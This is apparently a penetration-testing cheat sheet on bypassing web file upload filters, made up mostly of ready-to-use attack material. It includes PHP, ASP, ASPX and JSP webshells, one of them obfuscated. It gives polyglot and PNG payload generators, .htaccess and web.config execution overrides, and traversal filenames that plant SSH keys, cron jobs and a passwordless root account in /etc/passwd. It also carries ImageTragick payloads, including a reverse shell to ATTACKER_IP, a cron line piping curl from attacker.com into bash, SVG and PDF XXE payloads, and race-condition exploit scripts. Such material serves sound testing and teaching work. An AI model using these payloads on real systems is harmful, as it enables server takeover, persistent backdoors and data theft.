# 📂 File Upload Bypass

> A complete reference for identifying and exploiting file upload vulnerabilities during penetration testing and bug bounty engagements. Covers all bypass techniques — extension filters, MIME type spoofing, magic bytes manipulation, polyglot files, path traversal, RCE via webshells, and server-side misconfigurations.

---

## Table of Contents

- [Overview](#overview)
- [Attack Surface & File Upload Types](#attack-surface--file-upload-types)
- [Method 1 — Unrestricted File Upload (No Validation)](#method-1--unrestricted-file-upload-no-validation)
- [Method 2 — Extension Blacklist Bypass](#method-2--extension-blacklist-bypass)
- [Method 3 — Extension Whitelist Bypass](#method-3--extension-whitelist-bypass)
- [Method 4 — Double Extension Attack](#method-4--double-extension-attack)
- [Method 5 — Null Byte Injection](#method-5--null-byte-injection)
- [Method 6 — Content-Type / MIME Spoofing](#method-6--content-type--mime-spoofing)
- [Method 7 — Magic Bytes Manipulation](#method-7--magic-bytes-manipulation)
- [Method 8 — Polyglot Files](#method-8--polyglot-files)
- [Method 9 — .htaccess / web.config Upload](#method-9--htaccess--webconfig-upload)
- [Method 10 — Filename Path Traversal](#method-10--filename-path-traversal)
- [Method 11 — ZIP Slip (Archive Traversal)](#method-11--zip-slip-archive-traversal)
- [Method 12 — ImageMagick / ImageTragick RCE](#method-12--imagemagick--imagetragick-rce)
- [Method 13 — PNG IDAT Chunk Webshell](#method-13--png-idat-chunk-webshell)
- [Method 14 — SVG File — XSS & SSRF](#method-14--svg-file--xss--ssrf)
- [Method 15 — PDF Upload — XXE](#method-15--pdf-upload--xxe)
- [Method 16 — Trailing Dot / Space Bypass](#method-16--trailing-dot--space-bypass)
- [Method 17 — Case Sensitivity Bypass](#method-17--case-sensitivity-bypass)
- [Method 18 — Client-Side Validation Only](#method-18--client-side-validation-only)
- [Method 19 — Overwriting Server Config Files](#method-19--overwriting-server-config-files)
- [Method 20 — Race Condition Upload](#method-20--race-condition-upload)
- [Webshell Payloads](#webshell-payloads)
- [Complete Testing Checklist](#complete-testing-checklist)
- [Tools](#tools)
- [References](#references)

---

## Overview

**File upload vulnerabilities** occur when a web application allows users to upload files without properly validating their type, content, name, or destination. Attackers exploit these weaknesses to upload malicious files — webshells, scripts, archives — that lead to **Remote Code Execution (RCE)**, server compromise, data theft, or defacement.

File upload flaws are found in profile picture uploads, document submission forms, CMS plugins, support ticket attachments, and anywhere a web application accepts user-supplied files.

### How a Secure File Upload Should Work

```
[1] User selects file → Client-side type check (UI only)
        ↓
[2] File sent in multipart/form-data → Server receives raw bytes
        ↓
[3] Server validates: extension, MIME type, magic bytes, file size
        ↓
[4] File renamed to random name → Stored OUTSIDE web root
        ↓
[5] Served back via controller with Content-Disposition header
        ↓
[6] Upload directory has NO execution permissions
```

### Where Bypasses Occur

```
[1] Client-side only ────────  Remove JS validation, direct POST
[2] Extension check ─────────  Blacklist bypass, double ext, null byte
[3] MIME check ──────────────  Spoof Content-Type header
[4] Magic byte check ────────  Prepend valid bytes to payload
[5] Storage path ────────────  Path traversal in filename
[6] Execution possible ──────  Web root storage, misconfigured server
```

---

## Attack Surface & File Upload Types

| Upload Type | Common Location | Primary Risk |
|---|---|---|
| **Profile / Avatar** | User settings, registration | Webshell, stored XSS via SVG |
| **Document upload** | HR portals, support tickets | XXE via PDF/DOCX, RCE |
| **Image gallery** | CMS, blogs, e-commerce | ImageTragick RCE, polyglot PHP |
| **Backup / archive** | Admin panels | ZIP Slip path traversal |
| **Config / plugin** | WordPress, CMS admin | RCE via .php plugin upload |
| **CSV / Excel** | Data import tools | Formula injection, XXE |
| **Log upload** | SIEM, monitoring tools | Path traversal, LFI chain |

---

## Method 1 — Unrestricted File Upload (No Validation)

> The most critical finding. The application accepts any file type without any server-side restriction. Upload a webshell directly.

### Detection

```
1. Find a file upload form
2. Upload a .php (or .asp / .jsp) file containing a simple webshell
3. Navigate to the uploaded file URL
4. If code executes → fully unrestricted upload (CRITICAL)
```

### Test with cURL

```bash
# Upload PHP webshell directly
curl -X POST https://target.com/upload \
  -F "file=@shell.php;type=application/x-php"

# If response contains upload path → navigate to it
curl https://target.com/uploads/shell.php?cmd=id
```

### Quick Webshell

```php
<?php system($_GET['cmd']); ?>
```

---

## Method 2 — Extension Blacklist Bypass

> The application blocks specific dangerous extensions (e.g. `.php`) but does not block all executable variants. Try alternate extensions that the server may still execute.

### PHP Variants

```
.php
.php2
.php3
.php4
.php5
.php6
.php7
.phtml
.pht
.phar
.phps
.php%00.jpg     ← null byte (older PHP)
```

### ASP / ASPX Variants

```
.asp
.aspx
.asa
.asax
.ascx
.ashx
.asmx
.axd
.cer
.shtml
```

### JSP Variants

```
.jsp
.jspx
.jsw
.jsv
.jspf
.wss
.do
.action
```

### Cold Fusion / Other

```
.cfm
.cfml
.cfc
.dbm
.pl
.cgi
.sh
```

### Test with Burp Intruder

```
1. Intercept upload POST request in Burp Suite
2. Send to Intruder → Sniper mode
3. Mark the extension in the filename as payload position:
   filename="shell.§php§"
4. Use extension wordlist as payloads
5. Filter responses for 200 OK with upload path → execute each
```

---

## Method 3 — Extension Whitelist Bypass

> The application only allows specific extensions (e.g. `.jpg`, `.png`, `.pdf`). Bypass by making the malicious file appear to have an allowed extension while still being executable.

### Techniques

```bash
# Double extension — server processes leftmost extension
shell.php.jpg

# Reverse double extension — server may process .php
shell.jpg.php

# Extension with special chars
shell.php%20           # URL-encoded space
shell.php%00.jpg       # Null byte — truncates at %00
shell.php;.jpg         # Semicolon bypass (some servers)
shell.php/.jpg         # Slash bypass
shell.PhP              # Case variation
```

---

## Method 4 — Double Extension Attack

> Servers that process the first or last extension may execute a file named `shell.php.jpg` or `shell.jpg.php` as PHP.

### Apache `.htaccess` Misconfiguration

```bash
# Apache may execute any file with .php ANYWHERE in the name
# if AddHandler is misconfigured:
# AddHandler php5-script .php
# This executes shell.php.jpg as PHP
```

### Test Payloads

```
shell.php.jpg
shell.php.jpeg
shell.php.png
shell.php.gif
shell.php.pdf
shell.php.txt
shell.jpg.php
shell.png.php
shell.php5.jpg
shell.phtml.jpg
```

### Burp Steps

```
1. Upload legitimate image.jpg → confirm accepted
2. Rename to shell.php.jpg → re-upload
3. Navigate to uploaded file URL
4. Append ?cmd=id → check if PHP executes
```

---

## Method 5 — Null Byte Injection

> Older PHP versions (< 5.3.4) treat `%00` as a string terminator. A filename like `shell.php%00.jpg` is stored as `shell.php`, bypassing extension whitelist checks.

### Payloads

```
shell.php%00.jpg
shell.php%00.png
shell.php%00.gif
shell.php%2500.jpg    ← double URL-encoded null byte
shell.php\x00.jpg     ← raw null byte in filename
```

### In Burp

```
1. Intercept upload request
2. In filename field: shell.php%00.jpg
3. Forward → file stored as shell.php
4. Navigate to shell.php → code executes
```

> **Note:** Primarily affects PHP < 5.3.4 and some older frameworks. Still worth testing on legacy apps.

---

## Method 6 — Content-Type / MIME Spoofing

> The server validates the `Content-Type` header in the multipart request instead of inspecting the actual file content. Change the MIME type to a whitelisted value.

### Detection

```
1. Upload shell.php → server rejects with "only images allowed"
2. Intercept POST in Burp
3. Change: Content-Type: application/x-php
   To:     Content-Type: image/jpeg
4. Forward → if accepted → MIME bypass confirmed
```

### Burp Request Modification

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg          ← spoofed MIME type

<?php system($_GET['cmd']); ?>
------Boundary--
```

### Common MIME Values to Try

```
image/jpeg
image/png
image/gif
image/webp
application/pdf
text/plain
application/octet-stream
```

---

## Method 7 — Magic Bytes Manipulation

> The server inspects the first few bytes of the file (magic bytes / file signature) to determine its type. Prepend valid magic bytes to a webshell payload to spoof the file type check.

### Common Magic Bytes

| File Type | Magic Bytes (Hex) | ASCII |
|---|---|---|
| JPEG | `FF D8 FF E0` | `ÿØÿà` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG....` |
| GIF | `47 49 46 38 39 61` | `GIF89a` |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK..` |
| EXE/PE | `4D 5A` | `MZ` |

### Prepend Magic Bytes to PHP Shell

```bash
# Add GIF magic bytes before PHP code
echo 'GIF89a' > polyglot.php
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php

# Verify magic bytes
xxd polyglot.php | head -2
# 00000000: 4749 4638 3961 0a3c 3f70 6870 2073 7973  GIF89a.<?php sys
```

### With Python

```python
# Create JPEG + PHP polyglot
payload = b'\xFF\xD8\xFF\xE0'           # JPEG magic bytes
payload += b'\n<?php system($_GET["cmd"]); ?>\n'

with open('shell.php.jpg', 'wb') as f:
    f.write(payload)

print("[+] Polyglot JPEG+PHP created: shell.php.jpg")
```

### Upload & Execute

```bash
# Upload with Content-Type: image/jpeg
# Navigate to uploaded file with .php extension or if server executes .jpg
curl "https://target.com/uploads/shell.php.jpg?cmd=id"
```

---

## Method 8 — Polyglot Files

> Polyglot files are valid in two or more file formats simultaneously. A file that is both a valid GIF image and valid PHP code can bypass multi-layered validation while still being executable.

### GIF + PHP Polyglot

```
GIF89a
<?php system($_GET['cmd']); ?>
```

Upload as `shell.gif` — passes image validation. If server stores it accessible with PHP execution, the code runs.

### JPEG + PHP Polyglot

```bash
# Use exiftool to embed PHP in image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

### PDF + PHP Polyglot

```bash
# Prepend PDF header
printf '%PDF-1.4\n<?php system($_GET["cmd"]); ?>' > shell.pdf.php
```

### ZIP + PHP Polyglot

```bash
# Create a file that is both a valid ZIP and valid PHP
zip shell.zip legitimate.jpg
cat shell.zip > polyglot.php
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php
```

### Tools for Polyglot Generation

```bash
# Mitra — polyglot file generator
git clone https://github.com/corkami/mitra
python3 mitra.py -t jpg php payload.php image.jpg -o polyglot
```

---

## Method 9 — .htaccess / web.config Upload

> If the application allows uploading arbitrary filenames to a web-accessible directory, upload a `.htaccess` (Apache) or `web.config` (IIS) file to change how the server interprets files in that directory.

### Apache — .htaccess to Execute .jpg as PHP

```apache
# Upload this as .htaccess to the upload directory
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
```

After uploading `.htaccess`, upload a PHP webshell with `.jpg` extension — it will execute as PHP.

### Apache — .htaccess to Enable PHP in Directory

```apache
Options +ExecCGI
AddHandler cgi-script .jpg
```

### IIS — web.config to Execute .jpg as ASP

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="jpg-handler"
           path="*.jpg"
           verb="*"
           modules="IsapiModule"
           scriptProcessor="C:\Windows\System32\inetsrv\asp.dll"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

### Steps

```
1. Confirm upload directory is web-accessible
2. Upload .htaccess file with AddType rule
3. Upload webshell.jpg containing PHP code
4. Navigate to https://target.com/uploads/webshell.jpg?cmd=id
```

---

## Method 10 — Filename Path Traversal

> If the application uses the user-supplied filename when saving the file, a path traversal payload can place the file in an arbitrary location on the server.

### Payloads

```
../shell.php
../../shell.php
../../../var/www/html/shell.php
..%2Fshell.php
..%252Fshell.php        ← double URL-encoded
....//shell.php
..\shell.php            ← Windows path traversal
```

### Overwrite SSH authorized_keys

```bash
# Filename payload that writes SSH key to root's authorized_keys
filename: "../../../root/.ssh/authorized_keys"

# File content: your public key
ssh-rsa AAAAB3NzaC1yc2E... attacker@kali
```

### Burp Request

```http
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

---

## Method 11 — ZIP Slip (Archive Traversal)

> If the application extracts uploaded ZIP files without sanitizing entry paths, files with traversal paths inside the archive are extracted to arbitrary locations outside the intended directory.

### Create Malicious ZIP

```bash
# Create webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Create ZIP with path traversal entry
zip --entry "../../../var/www/html/shell.php" malicious.zip shell.php

# Python alternative
python3 -c "
import zipfile
with zipfile.ZipFile('malicious.zip', 'w') as z:
    z.write('shell.php', '../../../var/www/html/shell.php')
print('[+] ZIP Slip archive created')
"
```

### Cron Backdoor via ZIP Slip

```bash
# Payload file
echo '* * * * * root curl http://attacker.com/shell.sh | bash' > backdoor

# ZIP with traversal to cron.d
zip malicious.zip backdoor
# Rename entry to: ../../../etc/cron.d/backdoor
```

### Detection

```
1. Upload ZIP with path traversal entry
2. Check if files appear outside the upload directory
3. Navigate to traversed path (e.g. webroot) to confirm extraction
```

---

## Method 12 — ImageMagick / ImageTragick RCE

> ImageMagick versions < 6.9.3-9 are vulnerable to CVE-2016-3714 (ImageTragick). Uploading a malicious image file causes the server to execute arbitrary commands during processing.

### MVG Payload (upload as .jpg or .png)

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/shell.php|id)'
pop graphic-context
```

### Reverse Shell Payload

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1|touch "hello)'
pop graphic-context
```

### Save as image and upload

```bash
# Save payload as shell.jpg or shell.png
cat > shell.jpg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/shell.php|id)'
pop graphic-context
EOF

# Upload to any endpoint that processes images with ImageMagick
```

### Check if target uses ImageMagick

```bash
# If error messages leak version info:
# "convert: no decode delegate for this image format"
# Check response headers for ImageMagick version strings
```

---

## Method 13 — PNG IDAT Chunk Webshell

> PHP code can be embedded inside the IDAT (image data) chunk of a PNG file. The PHP-GD functions `imagecopyresized()` and `imagecopyresampled()` preserve the embedded code during image processing, allowing the webshell to survive server-side image re-processing.

### Create PNG with Embedded PHP

```python
import struct, zlib, sys

def create_png_with_php(output_file, php_code):
    png_header = b'\x89PNG\r\n\x1a\n'
    
    # IHDR chunk
    width, height = 32, 32
    ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
    ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data)
    ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)

    # IDAT chunk with PHP payload embedded
    raw = php_code.encode() + b'\x00' * (width * 3 * height - len(php_code))
    compressed = zlib.compress(raw)
    idat_crc = zlib.crc32(b'IDAT' + compressed)
    idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + struct.pack('>I', idat_crc)

    # IEND chunk
    iend_crc = zlib.crc32(b'IEND')
    iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)

    with open(output_file, 'wb') as f:
        f.write(png_header + ihdr + idat + iend)
    print(f"[+] PNG with PHP payload created: {output_file}")

create_png_with_php('shell.png', '<?php system($_GET["cmd"]); ?>')
```

### With exiftool (simpler)

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.png -o shell.png
```

---

## Method 14 — SVG File — XSS & SSRF

> SVG files are XML-based and can contain embedded JavaScript (XSS) or external entity references (SSRF/XXE). If the application displays uploaded SVGs inline in the browser, stored XSS or SSRF is possible.

### Stored XSS via SVG

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(document.cookie);
  </script>
</svg>
```

### SSRF via SVG External Resource

```xml
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://internal-server:8080/admin" />
</svg>
```

### XXE via SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

---

## Method 15 — PDF Upload — XXE

> PDF files can contain XML structures that trigger XXE (XML External Entity) injection if the server parses PDF content using an XML parser.

### Malicious PDF with XXE

```
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
endobj
```

### Test for XXE via PDF

```bash
# Create minimal PDF with XXE payload
python3 -c "
content = b'''%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 3 3]>>endobj
<?xml version=\"1.0\"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<test>&xxe;</test>
'''
open('xxe.pdf','wb').write(content)
"
```

---

## Method 16 — Trailing Dot / Space Bypass

> Windows systems strip trailing dots and spaces from filenames. On Windows-hosted web applications, `shell.php.` may be saved as `shell.php`, bypassing extension validation.

### Payloads

```
shell.php.
shell.php..
shell.php%20          ← trailing space (URL encoded)
shell.php%20%20
shell.php%00
shell.php/
shell.php::$DATA      ← Windows NTFS Alternate Data Stream
```

### Windows NTFS ADS Bypass

```
shell.php::$DATA
```

When uploaded to a Windows server with IIS, the `::$DATA` is stripped by the NTFS filesystem, saving the file as `shell.php`.

### Burp Steps

```
1. Intercept upload POST
2. Modify filename: "shell.php."   ← add trailing dot
3. Forward → server validates ".php." → may allow as non-PHP
4. Windows strips trailing dot → file saved as "shell.php"
5. Navigate to shell.php → executes
```

---

## Method 17 — Case Sensitivity Bypass

> Blacklist checks that use case-sensitive string matching can be bypassed with mixed-case extensions on case-insensitive filesystems (Windows / macOS).

### Payloads

```
shell.PHP
shell.Php
shell.pHp
shell.PHp
shell.pHP
shell.PhP
shell.PHP5
shell.PHTML
```

### Combined with Double Extension

```
shell.PHP.jpg
shell.pHp.png
shell.PhP.gif
```

---

## Method 18 — Client-Side Validation Only

> The application performs file type validation only in the browser (JavaScript) with no server-side check. Bypass by disabling JavaScript, using Burp, or crafting a direct HTTP request.

### Bypass Methods

```
1. Disable JavaScript in browser → upload directly
2. Intercept POST with Burp → modify file content / name
3. Use curl to POST directly, bypassing browser JS entirely
```

### Direct cURL Upload (bypasses all JS)

```bash
curl -X POST https://target.com/upload \
  -F "file=@shell.php" \
  -F "submit=Upload" \
  -b "session=YOUR_SESSION_COOKIE"
```

### Burp — Replace Image Content with Webshell

```
1. Upload legitimate image.jpg through the browser
2. Intercept the POST request in Burp
3. Replace file content:
   Original: [binary JPEG data]
   Replace:  <?php system($_GET['cmd']); ?>
4. Change filename: image.jpg → shell.php
5. Forward → server accepts (no server-side check)
```

---

## Method 19 — Overwriting Server Config Files

> If upload path and filename are attacker-controlled, overwrite sensitive server configuration or system files to escalate privileges or gain persistent access.

### Overwrite Apache .htaccess

```bash
# Upload as .htaccess to change directory behavior
Options +ExecCGI
AddHandler cgi-script .txt
```

### Overwrite SSH authorized_keys

```
Filename: ../../../root/.ssh/authorized_keys
Content:  ssh-rsa AAAAB3NzaC1... attacker@kali
```

### Overwrite Cron Jobs

```
Filename: ../../../etc/cron.d/evil
Content:  * * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Overwrite /etc/passwd (if writable)

```
Filename: ../../../etc/passwd
Content:  root:x:0:0:root:/root:/bin/bash
          hacker::0:0:hacker:/root:/bin/bash
```

---

## Method 20 — Race Condition Upload

> The server temporarily stores a file before validation, then deletes/moves it if invalid. During the brief window between upload and validation, the file may be accessible and executable.

### Concept

```
[1] File uploaded → stored in /tmp/uploads/shell.php (TEMPORARY)
        ↓
[2] Server begins validation (type check, AV scan) — takes milliseconds
        ↓
[3] If invalid → file deleted
        ↓
[RACE WINDOW] — between [1] and [3], file is accessible
```

### Exploit with Turbo Intruder (Burp)

```python
# Turbo Intruder script — race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False)

    # Upload request
    for i in range(100):
        engine.queue(target.req, target.baseInput, gate='upload')

    # Simultaneous fetch request during upload window
    for i in range(100):
        engine.queue(fetchReq, gate='upload')

    engine.openGate('upload')
```

### Python Race Condition Script

```python
import requests, threading

UPLOAD_URL = "https://target.com/upload"
SHELL_URL  = "https://target.com/uploads/shell.php"
COOKIES    = {"session": "YOUR_COOKIE"}

def upload():
    with open("shell.php", "rb") as f:
        requests.post(UPLOAD_URL,
            files={"file": ("shell.php", f, "image/jpeg")},
            cookies=COOKIES)

def fetch():
    r = requests.get(f"{SHELL_URL}?cmd=id", cookies=COOKIES)
    if "uid=" in r.text:
        print(f"[RACE WIN] RCE confirmed: {r.text[:80]}")

# Run upload and fetch simultaneously
for _ in range(50):
    threading.Thread(target=upload).start()
    threading.Thread(target=fetch).start()
```

---

## Webshell Payloads

### PHP

```php
# Minimal one-liner
<?php system($_GET['cmd']); ?>

# With output buffering
<?php echo shell_exec($_GET['cmd']); ?>

# Passthru variant
<?php passthru($_GET['cmd']); ?>

# POST-based (less visible in logs)
<?php system($_POST['cmd']); ?>

# Obfuscated (bypass keyword filters)
<?php $f='sys'.'tem'; $f($_GET['cmd']); ?>

# PentestMonkey full reverse shell (PHP)
# https://github.com/pentestmonkey/php-reverse-shell
```

### ASP

```asp
<% eval request("cmd") %>
<%  Set oSh = CreateObject("WScript.Shell")
    oSh.Run request("cmd") %>
```

### ASPX

```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"])); %>
```

### JSP

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

## Complete Testing Checklist

### Extension & Type Validation
- [ ] Upload `.php` / `.asp` / `.jsp` directly — accepted?
- [ ] Blacklist bypassed with `.phtml`, `.php5`, `.phar`?
- [ ] Double extension: `shell.php.jpg` executes as PHP?
- [ ] Null byte: `shell.php%00.jpg` stored as `shell.php`?
- [ ] Trailing dot/space: `shell.php.` → saved as `shell.php`?
- [ ] Case bypass: `shell.PHP` accepted and executed?
- [ ] Content-Type spoofed from `application/x-php` to `image/jpeg`?

### Magic Bytes & Content
- [ ] Magic bytes prepended to PHP code bypass file type check?
- [ ] Polyglot file (GIF89a + PHP) passes validation and executes?
- [ ] PNG IDAT chunk with embedded PHP survives image re-processing?
- [ ] exiftool comment injection executed as PHP?

### Config & Path
- [ ] `.htaccess` upload changes execution behavior of directory?
- [ ] `web.config` upload changes IIS execution rules?
- [ ] Filename path traversal (`../shell.php`) places file outside upload dir?
- [ ] ZIP slip extracts file to arbitrary path?
- [ ] Uploaded file stored in web root (directly accessible)?
- [ ] Upload directory has PHP execution enabled?

### Special File Types
- [ ] SVG upload causes stored XSS in browser?
- [ ] SVG SSRF reaches internal services?
- [ ] PDF upload triggers XXE?
- [ ] ImageMagick processes upload → RCE (ImageTragick)?

### Logic & Race
- [ ] Client-side JS validation only — direct POST bypasses it?
- [ ] Race condition between upload and validation?
- [ ] Old API version / endpoint lacks file type validation?
- [ ] Different HTTP method (PUT) allows upload without checks?

---

## Tools

| Tool | Purpose |
|---|---|
| **Burp Suite** | Intercept, modify filename/MIME/content, Intruder fuzzing |
| **Upload Bypass** | Automated file upload filter bypass tool |
| **exiftool** | Embed PHP payloads in image metadata |
| **Mitra** | Polyglot file generator |
| **ffuf** | Fuzz extension, MIME type, and magic bytes |
| **Nuclei** | Automated file upload vulnerability templates |
| **Fuxploider** | Automated file upload form fuzzer |
| **python-magic** | Detect/spoof magic bytes |
| **Gifsicle** | Embed PHP in GIF comment section |
| **PentestMonkey PHP shell** | Full-featured PHP reverse shell |
| **PayloadsAllTheThings** | Massive wordlist of upload bypass payloads |
| **Metasploit** | Post-exploitation via uploaded webshell |

---

## References

- OWASP — Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- PortSwigger — File Upload Vulnerabilities: https://portswigger.net/web-security/file-upload
- PayloadsAllTheThings — Upload Insecure Files: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files
- ImageTragick CVE-2016-3714: https://imagetragick.com
- PNG IDAT Chunk Encoding: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
- Intigriti — Advanced File Upload Guide: https://www.intigriti.com/researchers/blog/hacking-tools/insecure-file-uploads
- sAjibuu Upload_Bypass Tool: https://github.com/sAjibuu/Upload_Bypass
